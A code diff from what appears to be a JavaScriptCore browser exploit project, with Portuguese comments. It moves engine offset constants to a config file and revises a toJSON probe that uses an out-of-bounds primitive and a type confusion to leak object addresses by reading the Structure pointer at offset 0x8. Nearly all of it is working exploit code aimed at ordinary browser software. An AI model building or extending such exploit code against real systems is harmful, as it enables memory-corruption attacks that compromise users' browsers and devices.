@@ -5,9 +5,9 @@ import { AdvancedInt64, toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_write_absolute,
-    clearOOBEnvironment,
-    JSC_OFFSETS // Importar offsets do JSC para leitura de estruturas
+    clearOOBEnvironment
 } from '../core_exploit.mjs';
+import { JSC_OFFSETS } from '../config.mjs'; // <--- CORREÇÃO AQUI: Importar JSC_OFFSETS do config.mjs
 
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V41_ETAP = "OriginalHeisenbug_TypedArrayAddrof_v41_ExploitTypedArrayProbe";
 
@@ -86,20 +86,14 @@ function toJSON_TA_Probe_ExploitTypedArray() {
                 // Tentar ler do offset 0 como se fosse um double.
                 // Em JSC, objetos são ponteiros marcados. Um JSValue pode ser um double.
                 // Se a type confusion desorientou, talvez o início do objeto seja o ponteiro.
-                let temp_buffer_for_read = new ArrayBuffer(8); // Usar um novo buffer para evitar tocar o 'this' diretamente
-                let temp_float64_view = new Float64Array(temp_buffer_for_read);
-                let temp_uint32_view = new Uint32Array(temp_buffer_for_read);
-
-                // Copiar os primeiros 8 bytes de 'this' (ArrayBuffer/DataView) para o temp_buffer
-                // Isso pode ser perigoso se 'this' não for um ArrayBuffer ou DataView acessível.
-                // Poderíamos usar oob_read_absolute AQUI se tivéssemos o endereço de 'this'.
-                // Por enquanto, vamos tentar criar um DataView diretamente sobre 'this' e ler 0x0
-                let view_on_this = new DataView(this);
-                let low = view_on_this.getUint32(0, true);
-                let high = view_on_this.getUint32(4, true);
+                // Podemos usar JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET (0x8) para ler o ponteiro da estrutura.
+                // O this é o ArrayBuffer ou DataView real aqui.
+                let view_on_this = new DataView(this.buffer || this); // Se for TypedArray, use .buffer. Se for ArrayBuffer, use ele mesmo.
+                let low = view_on_this.getUint32(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, true); // Tenta ler o low do ponteiro da Structure
+                let high = view_on_this.getUint32(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET + 4, true); // Tenta ler o high do ponteiro da Structure
                 leaked_val = new AdvancedInt64(low, high).asFloat64();
 
-                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Attempted read from 'this' at offset 0. Leaked raw value: ${toHex(low)}:${toHex(high)} (as double: ${leaked_val})`, "vuln");
+                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Attempted read from 'this' at offset ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)}. Leaked raw value: ${toHex(low)}:${toHex(high)} (as double: ${leaked_val})`, "vuln");
                 current_call_details.addrof_result_from_this = leaked_val; // Armazena o valor bruto
                 all_probe_interaction_details_v41.push(current_call_details);
                 return { leaked_address_v41: leaked_val, leaked_obj_type: current_call_details.this_type }; // Retorna o valor numérico
